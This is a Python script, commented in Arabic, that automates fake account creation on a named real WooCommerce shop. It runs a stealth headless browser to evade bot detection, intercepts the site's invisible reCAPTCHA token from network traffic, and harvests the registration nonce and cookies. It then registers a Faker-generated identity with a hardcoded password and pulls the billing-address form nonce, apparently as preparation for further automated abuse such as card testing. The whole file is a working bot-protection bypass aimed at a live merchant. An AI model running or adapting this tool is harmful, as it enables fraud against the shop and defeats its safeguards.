import re
import json
import base64
import random
import time
import requests
from faker import Faker
from playwright.sync_api import sync_playwright
from playwright_stealth import Stealth  # ✅ التعديل الحاسم: استيراد الكلاس الحديث للإصدار 2.0+

# --- 1. إعداد البيانات العشوائية (Faker) ---
fake = Faker("en_UK")
f = fake.first_name()
l = fake.last_name()
k = f"{f} {l}"
e = f"{f.lower()}.{l.lower()}@gmail.com"

# بصمة المتصفح الموحدة لمنع كشف التلاعب
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

def fetch_captcha_and_session_data():
    """
    تفتح متصفح صامت لحصد التوكن، الـ Nonce، والكوكيز الحية بالاعتماد على درع التخفي الجديد
    """
    captured_token = None
    
    # ✅ التعديل هنا: دمج Stealth مباشرة مع سياق المتصفح المتزامن لحماية كل الصفحات تلقائياً
    with Stealth().use_sync(sync_playwright()) as p:
        print("[*] جاري تشغيل المتصفح الصامت بالخلفية بدروع التخفي الجديدة...")
        browser = p.chromium.launch(
            headless=True,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        )
        
        context = browser.new_context(
            user_agent=USER_AGENT,
            viewport={"width": 1920, "height": 1080}
        )
        
        page = context.new_page()
        
        # 💡 ملاحظة: تم حذف سطر stealth_sync(page) القديم لأن الموديل الجديد يحمي المتصفح ذاتياً الآن!
        
        # اعتراض استجابة الشبكة واقتناص توكن الكابتشا المخفية
        def intercept_response(response):
            nonlocal captured_token
            if "recaptcha/enterprise/reload" in response.url or "recaptcha/api2/reload" in response.url:
                try:
                    body = response.text()
                    match = re.search(r'rresp","(.+?)"', body)
                    if match:
                        captured_token = match.group(1)
                except Exception:
                    pass

        page.on("response", intercept_response)
        
        print("[*] جاري فتح صفحة الحساب لاستخراج البيانات صامتاً...")
        page.goto("https://greenmethods.com/my-account/", wait_until="commit")
        
        # محاكاة التمرير لتنشيط الكابتشا
        page.evaluate("window.scrollTo({top: 150, behavior: 'smooth'});")
        
        # انتظار التوكن بحد أقصى 15 ثانية
        timeout = 15
        start_time = time.time()
        while captured_token is None and (time.time() - start_time) < timeout:
            page.wait_for_timeout(500)
            
        if not captured_token:
            print("[-] انتهت المهلة ولم يتم التقاط التوكن.")
            browser.close()
            return None, None, None
            
        print("[+] تم صيد توكن Invisible بنجاح!")
        
        # استخراج الـ Nonce الخاص بالتسجيل
        html_content = page.content()
        nonce_match = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', html_content)
        register_nonce = nonce_match.group(1) if nonce_match else None
        
        # جلب الكوكيز
        playwright_cookies = context.cookies()
        
        browser.close()
        return captured_token, register_nonce, playwright_cookies

# --- 2. تشغيل الجسر البرمجي ونقل البيانات لـ Requests ---
cap_token, reg_nonce, session_cookies = fetch_captcha_and_session_data()

if cap_token and reg_nonce:
    print(f"[+] التوكن الجاهز: {cap_token[:40]}...")
    print(f"[+] الـ Nonce المستخرج: {reg_nonce}")
    
    r = requests.Session()
    
    # نقل الكوكيز بدقة
    for cookie in session_cookies:
        r.cookies.set(
            cookie['name'], 
            cookie['value'], 
            domain=cookie['domain'], 
            path=cookie['path']
        )
    print("[+] تم دمج كوكيز المتصفح بنجاح مع Requests.")

    headers = {
        'authority': 'greenmethods.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://greenmethods.com',
        'referer': 'https://greenmethods.com/my-account/',
        'sec-ch-ua': '"Chromium";v="124", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': USER_AGENT,
    }

    data = {
        'email': e,
        'password': 'Willia5766ms#123CR7',
        'g-recaptcha-response': cap_token,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://greenmethods.com/my-account/',
        'wc_order_attribution_session_start_time': '2026-07-09 22:38:43',
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': USER_AGENT,
        'woocommerce-register-nonce': reg_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    print("[*] جاري إرسال طلب الـ POST الموثوق لإنشاء الحساب...")
    response = r.post('https://greenmethods.com/my-account/', headers=headers, data=data)
    
    if "logout" in response.text.lower() or response.status_code == 200:
        print("[🎉] مبروك! تم تخطي الحماية الحية والتسجيل في السيرفر بنجاح كامل.")
    else:
        print("[-] فشل التسجيل، يرجى مراجعة الرد الخارجي للسيرفر.")

    # --- 3. جلب تفاصيل الفواتير ---
    print("[*] جاري الانتقال الآمن لصفحة الفواتير بنفس الجلسة المفتوحة...")
    billing_headers = {
        'authority': 'greenmethods.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://greenmethods.com/my-account/edit-address/',
        'user-agent': USER_AGENT,
    }

    response_billing = r.get('https://greenmethods.com/my-account/edit-address/billing/', headers=billing_headers)

    address_nonce = re.search(
        r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
        response_billing.text
    )

    if address_nonce:
        print(f"[+] تم استخراج Nonce الفواتير بنجاح: {address_nonce.group(1)}")
    else:
        print("[-] Nonce الفواتير غير موجود.")
else:
    print("[-] تعذر الاستمرار بسبب فشل صيد الكابتشا أو الـ Nonce الرئيسي.")
